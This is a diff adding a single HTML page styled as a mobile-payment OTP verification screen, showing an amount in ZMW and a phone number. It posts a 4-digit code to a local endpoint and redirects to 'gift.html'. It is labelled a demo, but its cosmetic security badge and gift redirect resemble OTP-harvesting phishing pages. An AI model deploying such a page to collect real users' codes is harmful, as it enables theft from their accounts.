@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>OTP Verification</title>
+<style>
+*{box-sizing:border-box}
+html,body{
+  margin:0;
+  min-height:100%;
+  background:#f5f6f7;
+  font-family:Arial,Helvetica,sans-serif;
+  color:#111827;
+}
+body{
+  display:flex;
+  justify-content:center;
+  align-items:flex-start;
+  min-height:100vh;
+  padding:24px 16px;
+}
+.card{
+  width:100%;
+  max-width:520px;
+  min-height:394px;
+  background:#fff;
+  border:1px solid #e7eaed;
+  border-radius:15px;
+  overflow:hidden;
+  box-shadow:0 1px 3px rgba(0,0,0,.05);
+}
+.top{
+  position:relative;
+  padding:24px 19px 16px;
+  border-bottom:1px solid #edf0f2;
+}
+.back{
+  font-size:10px;
+  color:#243b53;
+  margin-bottom:24px;
+}
+.amount{
+  position:absolute;
+  top:16px;
+  right:17px;
+  text-align:right;
+}
+.amount-label{
+  font-size:7px;
+  color:#89929d;
+  font-weight:700;
+  letter-spacing:.8px;
+}
+.amount-value{
+  color:#ff6500;
+  font-size:14px;
+  font-weight:800;
+  margin-top:1px;
+}
+h1{
+  font-size:17px;
+  margin:0 0 5px;
+  font-weight:800;
+  letter-spacing:-.3px;
+}
+.subtitle{
+  font-size:10px;
+  color:#687385;
+  line-height:1.3;
+}
+.content{
+  padding:27px 19px 15px;
+}
+.sending{
+  text-align:center;
+  margin-bottom:29px;
+}
+.sending-label{
+  color:#8a93a0;
+  font-size:7px;
+  font-weight:700;
+  letter-spacing:1px;
+  margin-bottom:6px;
+}
+.number{
+  font-size:11px;
+  font-weight:800;
+}
+.label{
+  color:#9099a5;
+  font-size:7px;
+  font-weight:700;
+  letter-spacing:.7px;
+  margin:0 0 5px 2px;
+}
+.otp-box{
+  width:100%;
+  height:45px;
+  border:1px solid #e9edf1;
+  border-radius:12px;
+  background:#f8f9fa;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:7px;
+}
+.otp{
+  width:100px;
+  height:28px;
+  border:0;
+  outline:0;
+  background:transparent;
+  text-align:center;
+  font-size:17px;
+  color:#1f2937;
+  font-weight:700;
+  padding:0;
+  letter-spacing:8px;
+}
+.otp::placeholder{color:#c8cfd8}
+.counter{
+  text-align:center;
+  color:#89929d;
+  font-size:8px;
+  margin-top:16px;
+}
+.verify{
+  width:100%;
+  height:45px;
+  border:0;
+  border-radius:12px;
+  margin-top:17px;
+  background:#ffad78;
+  color:#fff;
+  font-size:11px;
+  font-weight:800;
+  cursor:pointer;
+  box-shadow:0 7px 13px rgba(255,120,45,.16);
+}
+.verify:active{transform:scale(.99)}
+.secure{
+  text-align:center;
+  margin-top:17px;
+  color:#6d7782;
+  font-size:7px;
+  letter-spacing:.3px;
+}
+.secure span{
+  color:#00a651;
+  font-size:9px;
+  margin-right:3px;
+}
+.error{
+  text-align:center;
+  color:#c62828;
+  font-size:8px;
+  min-height:11px;
+  margin-top:7px;
+}
+@media(max-width:320px){
+  body{padding:0}
+  .card{max-width:100%;min-height:100vh;border-radius:0}
+  .top{padding-left:16px;padding-right:16px}
+  .content{padding-left:16px;padding-right:16px}
+}
+@media(min-width:321px) and (max-width:480px){
+  body{padding:0}
+  .card{max-width:100%;min-height:100vh;border-radius:0}
+  .top{padding-left:16px;padding-right:16px}
+  .content{padding-left:16px;padding-right:16px}
+}
+</style>
+</head>
+<body>
+<div class="card">
+  <div class="top">
+    <div class="back">‹&nbsp; Back</div>
+    <div class="amount">
+      <div class="amount-label">AMOUNT</div>
+      <div class="amount-value">ZMW 25.00</div>
+    </div>
+    <h1>OTP Verification</h1>
+    <div class="subtitle">Enter the demo OTP code below.</div>
+  </div>
+
+  <div class="content">
+    <div class="sending">
+      <div class="sending-label">SENDING TO</div>
+      <div class="number">778000667</div>
+    </div>
+
+    <div class="label">ENTER OTP CODE</div>
+    <div class="otp-box">
+      <input class="otp" type="text" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" aria-label="4-digit OTP" autocomplete="one-time-code">
+    </div>
+
+    <div class="counter" id="counter">0 / 4 digits</div>
+
+    <button class="verify" id="verify" type="button">Verify &amp; Complete&nbsp; ◉</button>
+    <div class="error" id="error"></div>
+
+    <div class="secure"><span>♧</span> SSL ENCRYPTED AND SECURE</div>
+  </div>
+</div>
+
+<script>
+const inputs=[...document.querySelectorAll(".otp")];
+const counter=document.getElementById("counter");
+const error=document.getElementById("error");
+const verify=document.getElementById("verify");
+
+function updateCounter(){
+  const count=inputs[0].value.length;
+  counter.textContent=count+" / 4 digits";
+}
+
+let attemptCount = Number(localStorage.getItem('kipkoOtpAttempts') || 0);
+
+inputs.forEach(input=>{
+  input.addEventListener("input",()=>{
+    input.value=input.value.replace(/\D/g,"").slice(0,4);
+    updateCounter();
+    error.textContent="";
+  });
+});
+
+document.getElementById("verify").addEventListener("click", async () => {
+  const otp=inputs.map(i=>i.value).join("");
+  if(!/^\d{4}$/.test(otp)){
+    error.textContent="Please enter all 4 digits.";
+    return;
+  }
+
+  verify.disabled = true;
+  error.style.color="#6d7782";
+  error.textContent="Verifying...";
+
+  try {
+    const response = await fetch('/api/verify-otp', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ otp })
+    });
+
+    const data = await response.json().catch(() => ({}));
+
+    if (!response.ok || !data.ok) {
+      throw new Error(data.error || 'Invalid OTP.');
+    }
+
+    localStorage.setItem('kipkoOtpAttempts', '0');
+    error.style.color="#14804a";
+    error.textContent="Verified. Redirecting...";
+    setTimeout(() => {
+      window.location.href = 'gift.html';
+    }, 700);
+  } catch (err) {
+    error.style.color="#c62828";
+    error.textContent=err.message || "Verification failed. Please try again.";
+    inputs.forEach(input => { input.value = ''; });
+    inputs[0].focus();
+    updateCounter();
+    verify.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
